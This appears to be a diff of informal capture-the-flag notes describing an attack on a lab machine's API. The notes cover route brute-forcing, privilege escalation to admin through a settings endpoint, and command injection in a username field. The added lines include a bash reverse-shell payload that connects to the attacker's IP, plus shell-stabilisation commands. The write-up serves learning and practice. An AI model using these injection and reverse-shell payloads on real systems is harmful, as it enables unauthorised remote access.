@@ -21,7 +21,7 @@
 - in access page there are 2 links (regenrate,coonectionpack)
 - fireup burpsuite and send the 2 request to repeater and the 2 request gave the same response (VPN creds)
 - i try playing with the directry /api/v1/user/vpn/generate from vpn adn all gave 404 or 301 except at /api/v1 it gave description of the api
-- **now we enumurate the api**
+# now we enumurate the api and exploit
 - go to curl and  play with the routes (bruteforce))
 - intersting api route /api/v1/admin/settings/update we could change user to admin
 - so we go to the path /api/v1/admin/settings/update and we got 200 with messege invalid content type
@@ -30,6 +30,6 @@
 - It’s worth checking if there is any command injection.
 - If the server is doing something like gen_vpn.sh [username], then I’ll try putting a ; in the username to break that into a new command. I’ll also add a # at the end to comment out anything that might come after my input. It works:
 - we go to generate vpn with admin and yes it has command inj **{"username":"kafafy ; id #"}** using this payload we got the id command
-- we try to get shell on the machine using bash reverse shell  **{"username":"kafafy ; id #"}**
-- 
-  
+- we try to get shell on the machine using bash reverse shell  **{"username":"kafafy ; bash -c 'bash -i >& /dev/tcp/10.10.16.63/1234 0>&1' #"}**
+- we stablize the shell using --> **python3 -c 'import pty:pty.spawn("/bin/bash")'** --> **stty raw -echo;fg** --> **export TERM=xterm**
+-   
